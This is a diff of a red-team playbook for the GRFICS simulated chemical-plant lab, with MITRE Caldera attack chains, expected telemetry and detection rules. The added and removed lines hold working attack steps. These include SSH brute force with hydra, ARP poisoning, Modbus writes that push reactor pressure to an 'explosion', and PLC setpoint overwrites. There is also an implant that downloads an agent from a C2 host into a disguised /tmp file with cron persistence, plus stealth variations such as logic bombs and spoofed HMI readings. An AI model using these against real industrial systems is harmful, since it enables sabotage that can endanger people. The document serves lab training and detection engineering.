-| Sensor spoofing on .14 | Simulation process alarms | Discrepancy between simulation internal pressure and Modbus-reported pressure | DC0109 (Process/Event Alarm) |
-| Purge valve manipulation | PLC app logs, simulation alarms | Purge valve position drops to 0 despite PLC commanding otherwise | DC0109 (Process/Event Alarm) |
-| Rate of Modbus transactions | Router Suricata | Abnormal burst of 5+ Modbus writes per second from a single source | DC0085 (Network Connection Creation) |
-
-### Variation: Noisier Approach - Modbus Register Fuzzing
-
-Replace the targeted write step with the fuzzing ability (`c3d4e5f6-3333-3333-3333-000000000004`). This creates chaotic, unpredictable process behavior that is much harder for operators to diagnose but generates significantly more Suricata alerts.
-
-### Escalation Path: Router Compromise to Disable IDS
-
-Before the main attack, compromise the router to disable Suricata and firewall rules:
-
-```yaml
-- id: c3d4e5f6-3333-3333-3333-000000000005
-  name: Router - Disable IDS via Web Interface
-  description: |
-    Login to router firewall UI with default creds and disable
-    Suricata IDS to prevent detection of subsequent Modbus attacks.
-  tactic: evasion
-  technique_id: T0816
-  technique_name: Device Restart/Shutdown
-  executors:
-  - platform: linux
-    name: sh
-    command: >
-      curl -s -c /tmp/router_cookies.txt
-      -X POST "http://192.168.90.200:5000/login"
-      -d "username=admin&password=password"
-      -L -o /tmp/router_login.html &&
-      echo "Router login attempted"
-    timeout: 30
+# ability: plc-agent-implant
+id: plc-agent-implant
+name: "Deploy Caldera Agent on PLC via Reverse Shell"
+tactic: persistence
+technique:
+  attack_id: T0857
+  name: System Firmware
+executors:
+  - name: sh
+    platform: linux
+    # Runs from the reverse shell session on PLC (handled via netcat/C2 pipe)
+    command: |
+      # From PLC reverse shell:
+      curl -s http://192.168.90.250:8888/file/download \
+           -H "file:sandcat.go-linux" \
+           -H "platform:linux" \
+           -o /tmp/.openplc_update && \
+      chmod +x /tmp/.openplc_update
+      
+      # Persist via cron (survives container restart if volume-backed)
+      (crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.openplc_update \
+        -server http://192.168.90.250:8888 \
+        -group plc -v > /dev/null 2>&1") | crontab -
+      
+      # Start agent immediately
+      /tmp/.openplc_update \
+        -server http://192.168.90.250:8888 \
+        -group plc \
+        -v &
+      
+      echo "[*] Caldera agent deployed on PLC. Group: plc"
+      echo "[*] Persistence: cron every 5 minutes"
 ```
 
 ---
 
-## Attack Chain 4 (Bonus): Safety System Defeat via run_bit Manipulation
+## 4. Expected Telemetry and Detection Opportunities
 
-**Adversary Profile**: Saboteur targeting the PLC's emergency shutdown capability. The `run_bit` at `%QX5.0` controls the PLC's safe-state behavior. Manipulating it via Modbus writes to the PLC's own Modbus slave interface could disable or interfere with the safety mechanism.
+### Chain 1 Telemetry
 
-### Technique Mapping
+| Attack Step | Log Source | Log File (from docker-compose) | Expected Event | DC Reference |
+|-------------|-----------|-------------------------------|----------------|--------------|
+| SSH brute force → HMI | HMI auth | `./shared_logs/hmi/auth.log` | Multiple `sshd: Failed password` events; eventual `Accepted password` | DC0067, DC0088 |
+| Nmap scan from HMI | Router Suricata | `./shared_logs/router/` | `ET SCAN Nmap` alerts; SYN flood to .95.0/24 | DC0078, DC0085 |
+| Modbus enumeration | Router Suricata | `./shared_logs/router/` | Modbus read requests to multiple unit IDs; `ET SCADA Modbus Scanner` | DC0082 |
+| Modbus baseline read | PLC syslog | `./shared_logs/plc/syslog` | Increased Modbus connection count from non-HMI source (HMI=90.107, scan from 90.107 is suspicious) | DC0109 |
+| SSH lateral HMI→EWS | EWS auth | `./shared_logs/ews/auth.log` | `sshd: Accepted password for admin from 192.168.90.107` (HMI→EWS is abnormal) | DC0067, DC0088 |
+| ARP poisoning | EWS/PLC kernel | `./shared_logs/ews/kern.log` | `neighbour: arp_cache: neighbor table overflow` or ARP reply storms | DC0016 |
+| Modbus valve injection | PLC audit | `./shared_logs/plc/audit` | Auditd syscalls showing write operations on Modbus socket; unusual register write patterns | DC0021, DC0032 |
+| Process alarm | Simulation alarms | `./shared_logs/simulation/process_alarms` | Pressure > 2800 kPa alarm; then > 3200 kPa CRITICAL alarm | DC0109 |
+| HMI loses real view | HMI Tomcat | `./shared_logs/hmi/catalina` | ScadaLTS may log Modbus read errors or value anomalies if MITM breaks TCP | DC0109 |
 
-| Stage | Step | Technique Name | Technique ID | Command/Action | Expected Effect |
-|-------|------|---------------|-------------|----------------|-----------------|
-| **Initial Access** | 1 | Default Credentials | T0812 | Caldera agent on Kali | C2 established |
-| **Discovery** | 2 | Remote System Information Discovery | T0888 | Enumerate PLC Modbus interface at 192.168.95.2:502 | Discover PLC's own Modbus slave registers |
-| **Collection** | 3 | Point & Tag Identification | T0861 | Read coils and holding registers on PLC (192.168.95.2) | Map %MW and %QX addresses to Modbus registers |
-| **Impact** | 4 | Modify Controller Tasking | T0821 | Write setpoint registers (MW0-MW4) to dangerous values | Alter control setpoints: lower pressure_sp, raise level_sp |
-| **Inhibit Response** | 5 | Safety Instrumented Function (SIF) Inhibit | T0880 | Write coil for run_bit to FALSE then immediately back to TRUE in a loop | Create intermittent shutdown/restart cycling |
-| **Impact** | 6 | Denial of Control | T0813 | Continuously write conflicting setpoints to PLC registers | PLC cannot maintain stable process control |
+### Chain 2 Telemetry
 
-### Caldera Implementation
+| Attack Step | Log Source | Log File | Expected Event |
+|-------------|-----------|----------|----------------|
+| EWS SSH brute force | EWS auth | `./shared_logs/ews/auth.log` | Repeated failed SSH from 90.107; eventual success |
+| OpenPLC web auth | PLC application | `./shared_logs/plc/plc_app/` | HTTP POST to `/dashboard` with credentials in Tomcat access log |
+| PLC program download | PLC application | `./shared_logs/plc/plc_app/` | HTTP GET `/upload-program` from unexpected source IP (95.5 instead of expected admin IP) |
+| PLC program upload | PLC application | `./shared_logs/plc/plc_app/` | HTTP POST `/upload-program` with multipart form data; .st file name change |
+| PLC restart | PLC syslog | `./shared_logs/plc/syslog` | OpenPLC service restart event; process recompilation log |
+| Pressure climb | Simulation alarms | `./shared_logs/simulation/process_alarms` | Progressive pressure alarm events; no operator response correlatable to HMI |
+| PLC audit | PLC audit | `./shared_logs/plc/audit` | Auditd: execve of compiler for .st file; file write to PLC program directory |
 
-**Ability: Read PLC Modbus Registers**
+### Chain 3 Telemetry
 
-```yaml
-- id: d4e5f6a7-4444-4444-4444-000000000001
-  name: Modbus - Enumerate PLC Internal Registers
-  description: |
-    Read holding registers MW0-MW30 on the PLC's own Modbus slave
-    at 192.168.95.2:502 to discover setpoint values.
-  tactic: collection
-  technique_id: T0861
-  technique_name: Point & Tag Identification
-  executors:
-  - platform: linux
-    name: sh
-    command: >
-      echo "=== PLC Holding Registers (Setpoints) ===" &&
-      ./modbus_cli 192.168.95.2 --port 502 read_hr 0 31 &&
-      echo "=== PLC Coils (run_bit at QX5.0 = coil 40) ===" &&
-      ./modbus_cli 192.168.95.2 --port 502 read_c 0 50 &&
-      echo "=== PLC Input Registers (process values) ===" &&
-      ./modbus_cli 192.168.95.2 --port 502 read_ir 100 13
-    payloads:
-    - modbus_cli
+| Attack Step | Log Source | Log File | Expected Event |
+|-------------|-----------|----------|----------------|
+| FC 0x17 overflow frame | Router Suricata | `./shared_logs/router/` | Oversized Modbus response frame (>260 bytes in response); Suricata rule for malformed Modbus PDU |
+| PLC crash/restart | PLC syslog | `./shared_logs/plc/syslog` | OpenPLC daemon crash (SIGSEGV); systemd restart event |
+| Reverse shell | PLC syslog | `./shared_logs/plc/syslog` | `/bin/bash` launched by OpenPLC process user (anomalous parent→child relationship) |
+| Caldera agent install | PLC audit | `./shared_logs/plc/audit` | `curl` execution; file write to `/tmp/`; crontab modification (`cron.d` or `/var/spool/cron`) |
+| Agent beaconing | Router Suricata | `./shared_logs/router/` | Unexpected outbound HTTP from 95.2 to 90.250:8888 (PLC should never initiate HTTP connections) |
+| Process manipulation | Simulation alarms | `./shared_logs/simulation/process_alarms` | Pressure/valve alarms; continuous cycling if agent persists |
+
+---
+
+## 5. Variations and Escalation Paths
+
+### Chain 1 Variations
+
+| Variation | Description | Noisier/Stealthier |
+|-----------|-------------|-------------------|
+| **Slow drip injection** | Instead of hard-zeroing the purge valve, gradually shift it by 5% per hour over 12 hours. The process drifts out of safe range slowly, mimicking a mechanical failure. | ✅ Stealthier — harder to distinguish from sensor drift |
+| **Direct simulation API attack** | Skip Modbus entirely; connect directly to `simulation:55555` and issue JSON write commands. Bypasses PLC control loop entirely. | ⚡ Noisier — unusual port connection from HMI |
+| **Timing the attack to maintenance windows** | Read the ScadaLTS HMI schedules (if accessible); inject during known shift changes when operator attention is reduced. | ✅ Stealthier — reduced operator response likelihood |
+
+**Escalation Path — Chain 1:**
+Combine ARP poisoning with process manipulation: while injecting bad commands to the simulation, also intercept and rewrite HMI Modbus read responses in-flight to display falsified safe values. This achieves simultaneous **Loss of View** (T0829) + **Manipulation of Control** (T0831) — the operator sees normal readings on ScadaLTS while the reactor is at 3150 kPa. Add a timed delay before the attack peaks to create an alibi window.
+
+---
+
+### Chain 2 Variations
+
+| Variation | Description | Noisier/Stealthier |
+|-----------|-------------|-------------------|
+| **Logic bomb** | Upload a program with a time-delayed trigger (`IF current_time > attack_time THEN remove_interlock`). Attacker logs out; sabotage activates hours later. | ✅ Stealthier — no correlation between access event and process event |
+| **Partial modification** | Only remove the *emergency stop* response, not the normal PID loop. Process still operates normally under moderate conditions but will fail to recover from any disturbance. | ✅ Stealthier — process looks normal until a natural disturbance occurs |
+
+**Escalation Path — Chain 2:**
+After uploading the malicious program, also modify the HMI ScadaLTS data source to poll values from a spoofed Modbus responder rather than the real PLC. This means the HMI displays the "expected" values from the original safe program even while the malicious program is running. Requires setting up a fake Modbus server on EWS that replays pre-recorded safe measurements.
+
+---
+
+### Chain 3 Variations
+
+| Variation | Description | Noisier/Stealthier |
+|-----------|-------------|-------------------|
+| **No Caldera agent — ephemeral exploit** | Execute process manipulation directly from the overflow payload via shellcode. No agent binary written to disk; entirely memory-resident. | ✅ Stealthier — no file IOCs, no cron entry |
+| **Exploit simulation instead of PLC** | The simulation container also exposes TCP 55555 with no auth. A simpler buffer-size attack or malformed JSON could crash or manipulate the simulation backend without needing Modbus at all. | ⚡ Noisier from a protocol standpoint but avoids the Modbus layer |
+
+**Escalation Path — Chain 3:**
+With a persistent Caldera agent on the PLC, combine Chains 2 and 3: use the agent to upload a malicious PLC program (replacing the legitimate one) via the OpenPLC web API locally (loopback, bypassing any network firewall rules), then cover tracks by restoring original program metadata. This means the malicious program runs but the OpenPLC web interface shows the original filename and timestamp.
+
+---
+
+## 6. Fully Worked End-to-End Example: Chain 1 from Start to Explosion
+
+### Prerequisites Checklist
+
+```
+☐ docker-compose up -d (all services running)
+☐ chmod +x init_shared_logs.sh && ./init_shared_logs.sh
+☐ Caldera server running at 192.168.90.250:8888
+☐ Caldera UI accessible at http://localhost:8888 (credentials: admin/admin)
+☐ Kali container running with Caldera agent pre-deployed:
+    docker exec kali /tmp/.svc \
+      -server http://192.168.90.250:8888 \
+      -group kali -v &
 ```
 
-**Ability: Manipulate PLC Setpoints**
+### Execution Timeline
 
-```yaml
-- id: d4e5f6a7-4444-4444-4444-000000000002
-  name: Modbus - Overwrite PLC Setpoints
-  description: |
-    Write dangerous setpoint values directly to the PLC's Modbus registers.
-    MW0 (product_flow_setpoint) = 65535 (max flow),
-    MW2 (pressure_sp) = 0 (no pressure control),
-    MW4 (level_sp) = 65535 (max level).
-  tactic: impair-process-control
-  technique_id: T0821
-  technique_name: Modify Controller Tasking
-  executors:
-  - platform: linux
-    name: sh
-    command: >
-      for i in $(seq 1 60); do
-        ./modbus_cli 192.168.95.2 --port 502 write_r 0 65535;
-        ./modbus_cli 192.168.95.2 --port 502 write_r 2 0;
-        ./modbus_cli 192.168.95.2 --port 502 write_r 4 65535;
-        sleep 0.5;
-      done
-    payloads:
-    - modbus_cli
+#### T+0:00 — Stage 1: SSH Brute Force on HMI
+
+```bash
+# From Caldera UI: trigger ability ssh-brute-hmi on group=kali
+# OR manually from kali container:
+docker exec -it kali bash
+hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+      ssh://192.168.90.107 -t 4 -V
+
+# Expected result:
+# [22][ssh] host: 192.168.90.107   login: admin   password: admin
 ```
 
-**Adversary Profile:**
+**Log generated:** `./shared_logs/hmi/auth.log`
+```
+Mar 24 10:00:01 hmi sshd[1234]: Failed password for admin from 192.168.90.6 port 34521 ssh2
+Mar 24 10:00:03 hmi sshd[1234]: Failed password for admin from 192.168.90.6 port 34522 ssh2
+[... 47 failures ...]
+Mar 24 10:02:15 hmi sshd[1234]: Accepted password for admin from 192.168.90.6 port 34569 ssh2
+```
 
-```yaml
-name: Safety System Defeat Adversary
-description: >
-  Targets the PLC's internal Modbus registers to overwrite setpoints
-  and manipulate the run_bit, defeating the built-in safe-state
-  mechanism of the chemical plant control program.
-adversary_id: cc004444-aaaa-bbbb-cccc-000000000004
-objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
-atomic_ordering:
-- a1b2c3d4-1111-1111-1111-000000000001  # Network scan
-- d4e5f6a7-4444-4444-4444-000000000001  # Enumerate PLC registers
-- a1b2c3d4-1111-1111-1111-000000000002  # Read tank state (baseline)
-- d4e5f6a7-4444-4444-4444-000000000002  # Overwrite setpoints
-- a1b2c3d4-1111-1111-1111-000000000002  # Verify impact on tank
+#### T+2:15 — Stage 2: Deploy Caldera Agent on HMI
+
+```bash
+# From kali (90.6) → SSH into HMI:
+ssh admin@192.168.90.107
+
+# Deploy agent:
+curl -s http://192.168.90.250:8888/file/download \
+     -H "file:sandcat.go-linux" -H "platform:linux" \
+     -o /tmp/.tomcat_update && chmod +x /tmp/.tomcat_update
+/tmp/.tomcat_update -server http://192.168.90.250:8888 \
+                    -group hmi -v > /dev/null 2>&1 &
+
+# Verify in Caldera UI: Agents → hmi agent appears in group "hmi"
+```
+
+#### T+2:45 — Stage 3: ICS Network Discovery
+
+```bash
+# Caldera triggers nmap-ics-net ability on group=hmi
+# From HMI (90.107):
+nmap -sV -p 22,80,502,8080,55555 --open -oN /tmp/ics_scan.txt \
+     192.168.95.0/24
+```
+
+**Expected output:**
+```
+192.168.95.2  (plc)
+  22/open   ssh     OpenSSH 7.2
+  502/open  modbus
+  8080/open http    OpenPLC 2.0
+
+192.168.95.5  (ews)
+  22/open   ssh     OpenSSH 7.2
+  6080/open http    VNC/noVNC
+
+192.168.95.10 (simulation)
+  80/open   http    Unity visualization
+  55555/open        unknown (JSON API)
+```
+
+**Log generated:** `./shared_logs/router/eve.json` (Suricata)
+```json
+{"event_type":"alert","alert":{"signature":"ET SCAN Nmap Scripting Engine User-Agent Detected","severity":2},"src_ip":"192.168.90.107","dest_ip":"192.168.95.2"}
+```
+
+#### T+5:00 — Stage 3b: Modbus Tag Enumeration
+
+```bash
+# Caldera triggers modbus-enum-plc on group=hmi
+# pymodbus script enumerates unit IDs 1-5 and register blocks
+# Output saved to /tmp/modbus_map.json
+
+# Key discovery:
+# Unit 1, registers 0-13: process measurements
+# Unit 3, register 2: purge valve position (write = T0836 target)
+# Unit 4, register 3: product valve position (write = T0836 target)
+```
+
+**Log generated:** `./shared_logs/router/eve.json`
+```json
+{"event_type":"alert","alert":{"signature":"ET SCADA Modbus Read Holding Registers Attempt","severity":3},"src_ip":"192.168.90.107","dest_ip":"192.168.95.2","dest_port":502}
+```
+
+#### T+7:00 — Stage 4: Process Baseline Collection
+
+```bash
+# modbus-read-baseline ability on group=hmi
+# Sample output:
+{
+  "pressure": 1850,        ← current reactor pressure (kPa)
+  "liquidlevel": 4200,
+  "purgevalvepos": 45,     ← purge valve 45% open (normal)
+  "productvalvepos": 62,   ← product valve 62% open (normal)
+  "simulation_api": {
+    "process": "simpleTE",
+    "outputs": {"pressure": 18.50, ...}
+  }
+}
+```
+
+#### T+9:00 — Stage 5: Lateral Movement HMI → EWS
+
+```bash
+# ssh-lateral-ews ability on group=hmi
+ssh admin@192.168.95.5  # credential reuse: admin/admin
+# Deploy agent on EWS
+curl -s http://192.168.90.250:8888/file/download \
+     -H "file:sandcat.go-linux" -H "platform:linux" \
+     -o /tmp/.svc && chmod +x /tmp/.svc
+/tmp/.svc -server http://192.168.90.250:8888 -group ews -v &
+```
+
+**Log generated:** `./shared_logs/ews/auth.log`
+```
+Mar 24 10:09:01 ews sshd[2100]: Accepted password for admin from 192.168.90.107 port 54321 ssh2
+```
+
+#### T+11:00 — Stage 6: ARP Poisoning (Operator Blinding)
+
+```bash
+# arp-poison-hmi-plc ability on group=ews
+# From EWS (95.5), which is on b-ics-net with PLC (95.2)
+# Note: HMI is on c-dmz-net; ARP poisoning between EWS and PLC
+# disrupts the EWS→PLC Modbus path (engineering access blind)
+echo 1 > /proc/sys/net/ipv4/ip_forward
+arpspoof -i eth0 -t 192.168.95.2 192.168.95.5 &   # Tell PLC we are EWS
+arpspoof -i eth0 -t 192.168.95.5 192.168.95.2 &   # Tell EWS we are PLC
+```
+
+**Log generated:** `./shared_logs/ews/kern.log`
+```
+[12345.678] ews kernel: eth0: Promiscuous mode enabled
+[12346.001] ews kernel: neighbour: arp_cache: neighbour table overflow!
+```
+
+#### T+12:00 — Stage 7: Modbus Command Injection (IMPACT)
+
+```bash
+# modbus-inject-valves ability on group=ews
+# This is the ICS impact step
+python3 modbus_inject.py
+```
+
+**Live console output:**
+```
+[*] Injecting malicious valve setpoints...
+[*] Current pressure: 1850 kPa (limit: 3200)
+[*] Current pressure: 1923 kPa (limit: 3200)
+[*] Current pressure: 2156 kPa (limit: 3200)
+[*] Current pressure: 2489 kPa (limit: 3200)
+[*] Current pressure: 2801 kPa (limit: 3200)
+[*] Current pressure: 3055 kPa (limit: 3200)
+[!] CRITICAL: Approaching safety limit!
+[*] Current pressure: 3200 kPa (limit: 3200)
+[!] EXPLOSION EVENT — simulation visualization triggered
+```
+
+**Logs generated simultaneously:**
+
+`./shared_logs/simulation/process_alarms`:
+```
+2026-03-24T10:12:45 ALARM HIGH_PRESSURE pressure=2800.0 limit=2800 status=WARNING
+2026-03-24T10:13:02 ALARM HIGH_PRESSURE pressure=3100.0 limit=3200 status=CRITICAL
+2026-03-24T10:13:15 ALARM HIGH_PRESSURE pressure=3200.0 limit=3200 status=EXPLOSION
+```
+
+`./shared_logs/router/eve.json`:
+```json
+{"timestamp":"2026-03-24T10:12:00","event_type":"alert",
+ "alert":{"signature":"ET SCADA Modbus Write Holding Registers Attempt",
+          "severity":1},
+ "src_ip":"192.168.95.5","dest_ip":"192.168.95.2","dest_port":502}
+```
+
+`./shared_logs/plc/audit`:
+```
+type=SYSCALL msg=audit(1711274945.123:456): arch=c000003e syscall=1 
+success=yes exit=4 a0=5 a1=7f1234567890 a2=4 items=0 ppid=1 pid=234 
+auid=0 uid=0 gid=0 comm="openplc" exe="/usr/bin/openplc"
 ```
 
 ---
 
-## Fully Worked Example: Chain 1 from Start to Impact
+## 7. Detection Engineering Summary
 
-This section provides an exact, step-by-step reproduction procedure.
+For the SOC team consuming logs via Elasticsearch/Kibana, here are the key correlation rules:
 
-### Prerequisites
-
-1. Start the GRFICS environment:
-```bash
-cd /home/imene/Desktop/Github/GRFICSv3
-docker compose up -d
 ```
+RULE 1 — Brute Force + Lateral Movement
+  WHEN hmi/auth.log: >10 failed SSH in 60s from same src_ip
+  THEN hmi/auth.log: successful SSH from same src_ip
+  THEN ews/auth.log: successful SSH from hmi_ip within 300s
+  → ALERT: Credential Brute Force followed by Lateral Movement
 
-2. Verify all containers are running:
-```bash
-docker compose ps
-```
+RULE 2 — Unexpected Modbus Source
+  WHEN router/suricata: Modbus TCP to 95.2 or 95.10
+  FROM src_ip NOT IN [known_hmi_ips, known_scada_ips]
+  → ALERT: Unauthorized Modbus Access Attempt
 
-3. Open the 3D simulation at `http://localhost` to observe the chemical plant.
+RULE 3 — PLC Program Modification
+  WHEN plc/plc_app: HTTP POST /upload-program
+  FROM src_ip NOT IN [authorized_engineering_ips]
+  → ALERT: Unauthorized PLC Program Upload
 
-### Step A: Access Caldera and Deploy Agent
+RULE 4 — Process Alarm Correlation with Network Event
+  WHEN simulation/process_alarms: pressure > 2800
+  AND router/suricata: Modbus write within preceding 300s
+  FROM src_ip in [non-plc-ips]
+  → ALERT: Potential ICS Process Manipulation via Modbus
 
-1. Open `http://localhost:8888` in your browser.
-2. Login: `red` / `fortiphyd-red`
-3. Navigate to **Agents** > click the blue **+ Deploy an Agent** button.
-4. Select: Platform = `linux`, Agent = `Sandcat`, Contact = `HTTP`, enter `http://192.168.90.250:8888` as the server address.
-5. Copy the deployment command.
-6. Open Kali at `http://localhost:6088` (noVNC, credentials `kali:kali`).
-7. Open a terminal in Kali and run the deployment command:
+RULE 5 — Buffer Overflow Indicator
+  WHEN router/suricata: Modbus FC=0x17 with payload > 260 bytes
+  THEN plc/syslog: OpenPLC crash/restart within 30s
+  → ALERT: Possible libmodbus Buffer Overflow Exploit
 
-```bash
-server="http://192.168.90.250:8888";
-curl -s -X POST -H "file:sandcat.go" -H "platform:linux" \
-  $server/file/download > splunkd;
-chmod +x splunkd;
-./splunkd -server $server -group red -v
-```
-
-8. Return to Caldera UI -- the Kali agent should appear within 60 seconds under **Agents**.
-
-### Step B: Add Custom Abilities via REST API
-
-From your host machine, use the Caldera REST API to create the abilities. For each ability YAML above:
-
-```bash
-# Example: Create the "Read Tank Pressure" ability
-curl -X POST http://localhost:8888/api/v2/abilities \
-  -H "KEY: VEvMp339du5M5efw5TpfUfiChPfbcN2Spc11jJ1y78Y" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "ability_id": "a1b2c3d4-1111-1111-1111-000000000002",
-    "name": "Modbus - Read Tank Pressure and Level",
-    "description": "Read input registers from Tank device",
-    "tactic": "collection",
-    "technique_id": "T0801",
-    "technique_name": "Monitor Process State",
-    "executors": [
-      {
-        "platform": "linux",
-        "name": "sh",
-        "command": "./modbus_cli 192.168.95.14 --port 502 read_ir 1 2",
-        "payloads": ["modbus_cli"]
-      }
-    ]
-  }'
-```
-
-Repeat for all abilities. Alternatively, copy the YAML files directly into the Caldera container:
-
-```bash
-docker cp my_ability.yml caldera:/usr/src/app/plugins/modbus/data/abilities/discovery/
-docker restart caldera
-```
-
-### Step C: Create Adversary Profile
-
-```bash
-curl -X POST http://localhost:8888/api/v2/adversaries \
-  -H "KEY: VEvMp339du5M5efw5TpfUfiChPfbcN2Spc11jJ1y78Y" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "adversary_id": "cc001111-aaaa-bbbb-cccc-000000000001",
-    "name": "ICS Pressure Manipulation Adversary",
-    "description": "Multi-stage Modbus attack causing reactor overpressure",
-    "atomic_ordering": [
-      "a1b2c3d4-1111-1111-1111-000000000001",
-      "9360ba0d-46a3-47a1-bbe6-e6c875790500",
-      "a1b2c3d4-1111-1111-1111-000000000003",
-      "a1b2c3d4-1111-1111-1111-000000000002",
-      "a1b2c3d4-1111-1111-1111-000000000004",
-      "a1b2c3d4-1111-1111-1111-000000000005"
-    ]
-  }'
-```
-
-### Step D: Launch the Operation
-
-```bash
-curl -X POST http://localhost:8888/api/v2/operations \
-  -H "KEY: VEvMp339du5M5efw5TpfUfiChPfbcN2Spc11jJ1y78Y" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "name": "ICS-Pressure-Attack-001",
-    "adversary": {"adversary_id": "cc001111-aaaa-bbbb-cccc-000000000001"},
-    "source": {"id": "0033b644-a615-4eff-bcf3-178e9b17adc3"},
-    "planner": {"id": "aaa7c857-37a0-4c4a-85f7-4e9f7f30e31a"},
-    "group": "red",
-    "auto_close": false,
-    "autonomous": 1
-  }'
-```
-
-### Step E: Observe Impact
-
-1. **Caldera Operations Panel**: Watch each step transition from queued -> running -> finished. Check output for each link.
-2. **3D Simulation** (`http://localhost`): Watch the reactor pressure gauge climb and tank level change as valves are manipulated.
-3. **HMI** (`http://localhost:6081`): Observe SCADA-LTS data points showing the valve position and pressure deviations.
-4. **PLC** (`http://localhost:8080`): Login and check the monitoring dashboard for register value anomalies.
-
-### Step F: Verify Telemetry
-
-Check the shared log volumes for detection evidence:
-
-```bash
-# Suricata alerts
-docker exec router cat /var/log/suricata/eve.json | \
-  python3 -m json.tool | grep -A5 "modbus"
-
-# PLC auth events
-cat shared_logs/plc/auth.log
-
-# Simulation process alarms
-ls -la shared_logs/simulation/process_alarms/
+RULE 6 — Unexpected Outbound HTTP from PLC
+  WHEN router/suricata: HTTP connection FROM 192.168.95.2
+  TO ANY DEST (PLC should NEVER initiate HTTP)
+  → ALERT: C2 Beaconing from PLC — Critical IOC
 ```
 
 ---
 
-## Summary Comparison of All Chains
+## 8. Quick Reference: Caldera Operation Templates
 
-| Attribute | Chain 1: Direct Modbus Write | Chain 2: PLC Logic Replacement | Chain 3: HMI + Deception | Chain 4: Safety System Defeat |
-|-----------|------------------------------|-------------------------------|--------------------------|------------------------------|
-| **Primary Target** | Simulation Modbus devices (.10-.15) | PLC OpenPLC runtime (.2) | HMI + Modbus devices | PLC internal registers (.2) |
-| **Initial Access** | Agent on Kali | Agent on Kali | Agent on Kali | Agent on Kali |
-| **Key Technique** | Write Holding Registers (FC 0x06) | Upload ST program via HTTP | Combined Modbus writes + HMI login | Write setpoints + coils on PLC |
-| **Stealth Level** | Medium (direct Modbus from attacker IP) | Low (HTTP traffic to PLC, program change logged) | High (masks attack via spoofed sensors) | Medium (writes to PLC from attacker IP) |
-| **Persistence** | None (must sustain writes) | High (malicious logic runs until replaced) | None | Medium (setpoints persist until overwritten) |
-| **Physical Impact** | Pressure excursion | Full process loss of control | Pressure excursion + operator blind | Setpoint corruption, intermittent faults |
-| **MITRE ICS Techniques** | T0819, T0846, T0842, T0888, T0861, T0801, T0831, T0879 | T0819, T0846, T0812, T0843, T0889, T0827 | T0812, T0846, T0852, T0888, T0801, T0856, T0831, T0829 | T0812, T0888, T0861, T0821, T0880, T0813 |
-| **Detection Difficulty** | Easy (unauthorized Modbus source) | Medium (legitimate HTTP to PLC web) | Hard (looks like normal operator activity + sensors spoofed) | Medium (Modbus to PLC from unusual source) |
+```yaml
+# ── OPERATION TEMPLATE: All 3 Chains ──────────────────────────────────────
+operations:
+  
+  chain1:
+    name: "GRFICS-Chain1-Modbus-Injection"
+    adversary: "chain1-grfics-modbus-injection"
+    planner: sequential
+    groups: [kali, hmi, ews]
+    facts:
+      - {trait: plc.ip, value: "192.168.95.2"}
+      - {trait: sim.ip, value: "192.168.95.10"}
+      - {trait: ews.ip, value: "192.168.95.5"}
+      - {trait: hmi.ip, value: "192.168.90.107"}
 
----
+  chain2:
+    name: "GRFICS-Chain2-PLC-Reprogramming"
+    adversary: "chain2-grfics-plc-reprogram"
+    planner: sequential
+    groups: [kali, hmi, ews]
+    facts:
+      - {trait: openplc.url, value: "http://192.168.95.2:8080"}
+      - {trait: openplc.user, value: "openplc"}
+      - {trait: openplc.pass, value: "openplc"}
 
-## Detection Engineering Recommendations
+  chain3:
+    name: "GRFICS-Chain3-BOF-RCE-Implant"
+    adversary: "chain3-grfics-bof-rce"
+    planner: sequential
+    groups: [kali, hmi, plc]
+    facts:
+      - {trait: plc.ip, value: "192.168.95.2"}
+      - {trait: plc.modbus.port, value: "502"}
+      - {trait: caldera.c2, value: "http://192.168.90.250:8888"}
+      - {trait: bof.read_count, value: "150"}
+```
 
-For each attack chain, the following detection rules should be developed:
-
-1. **Unauthorized Modbus Source**: Alert when any IP other than `192.168.95.2` (PLC) sends Modbus FC 0x05/0x06/0x0F/0x10 writes to simulation devices (.10-.15). This catches Chains 1, 3, and 4.
-
-2. **PLC Web Interface Access from DMZ**: Alert when HTTP requests to `192.168.95.2:8080` originate from the DMZ subnet (192.168.90.0/24). This catches Chain 2.
-
-3. **Modbus Write Frequency Anomaly**: Alert when more than N Modbus write transactions per second occur from a single source. Baseline the PLC's normal polling rate (100ms = 10/sec across 6 devices) and alert on deviations.
-
-4. **Process Value Deviation**: Alert when pressure exceeds 3000 kPa or deviates more than 10% from 5-minute moving average. This catches the physical impact of all chains.
-
-5. **PLC Program Change**: Alert when the OpenPLC `/upload-program` or `/compile-program` endpoints are accessed. Any program change in a production environment should trigger investigation.
-
-6. **Sensor Value Discrepancy**: Cross-correlate Tank pressure readings with PLC input register values. If they diverge, sensor spoofing (Chain 3 escalation) is likely.
-
+This playbook gives a security engineering team everything needed to reproduce all three attack chains in the GRFICS environment, observe the resulting process impacts in the Unity 3D visualization, and use the expected telemetry patterns to build and validate detection rules in Kibana against the Elasticsearch log pipeline.
